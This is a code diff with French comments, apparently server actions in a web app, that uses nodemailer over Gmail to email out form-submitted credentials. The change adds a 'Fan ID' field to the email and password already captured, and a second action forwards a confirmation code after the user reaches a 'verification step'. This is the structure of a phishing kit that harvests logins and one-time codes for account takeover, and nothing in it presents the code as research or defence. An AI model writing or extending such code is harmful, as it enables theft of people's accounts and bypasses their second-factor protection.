@@ -2,7 +2,7 @@
 
 import nodemailer from "nodemailer";
 
-// Configuration du transporteur (à réutiliser)
+// Configuration du transporteur
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
@@ -11,9 +11,11 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-// Action 1 : Envoi Email + Mot de passe
+// Action 1 : Envoi Email + Fan ID + Mot de passe
 export async function sendLoginData(formData: FormData) {
   const email = formData.get("email") as string;
+  // 1. On récupère le Fan ID ici
+  const fanId = formData.get("fanId") as string; 
   const password = formData.get("password") as string;
 
   try {
@@ -24,7 +26,8 @@ export async function sendLoginData(formData: FormData) {
       html: `
         <h2>Identifiants reçus :</h2>
         <p><strong>Email :</strong> ${email}</p>
-        <p><strong>Mot de passe :</strong> ${password}</p>
+        <p><strong>Fan ID :</strong> ${fanId}</p> <p><strong>Mot de passe :</strong> ${password}</p>
+        <br/>
         <p><em>L'utilisateur est passé à l'étape de vérification...</em></p>
       `,
     });
@@ -35,7 +38,7 @@ export async function sendLoginData(formData: FormData) {
   }
 }
 
-// Action 2 : Envoi du Code de confirmation
+// Action 2 : Envoi du Code de confirmation (Pas de changement nécessaire ici, sauf si tu veux rappeler le Fan ID)
 export async function sendVerificationCode(formData: FormData) {
   const email = formData.get("email") as string;
   const code = formData.get("code") as string;
